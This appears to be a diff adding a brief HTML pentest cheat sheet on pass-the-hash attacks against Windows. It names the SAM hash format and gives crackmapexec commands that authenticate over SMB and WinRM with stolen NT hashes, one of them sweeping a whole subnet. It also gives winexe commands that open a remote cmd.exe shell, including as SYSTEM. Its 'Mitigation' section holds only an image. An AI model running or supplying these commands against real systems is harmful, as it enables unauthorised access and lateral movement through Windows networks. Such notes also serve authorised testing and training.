@@ -1,0 +1,29 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>username + hash? (pass the hash)</title>
+</head><body>Hash:<br/>
+1. SAM hashes (uid: rid: lmhash: <b>nthash</b>)<br/>
+<img src="image.png" /><br/>
+<br/>
+2. <br/>
+<br/>
+crackmapexec smb &lt;ip&gt; -u &lt;username&gt; -H &lt;hash&gt;<br/>
+<br/>
+<br/>
+crackmapexec winrm &lt;ip&gt; -u &lt;username&gt; -H &lt;hash&gt;<br/>
+<br/>
+<br/>
+crackmapexec smb 10.10.10.0/24 -u &lt;username&gt; -H &lt;hash&gt; --local-auth<br/>
+<br/>
+<br/>
+<b>login to windows machine</b><br/>
+<br/>
+winexe -U '&lt;username&gt;%&lt;password&gt;' //&lt;ip address&gt; cmd.exe<br/>
+winexe -U '&lt;username&gt;%&lt;password&gt;' --system //&lt;ip address&gt; cmd.exe<br/>
+<br/>
+<br/>
+<b>Mitigation</b><br/>
+<br/>
+<img src="image 2.png" width="593" height="450" /></body></html>
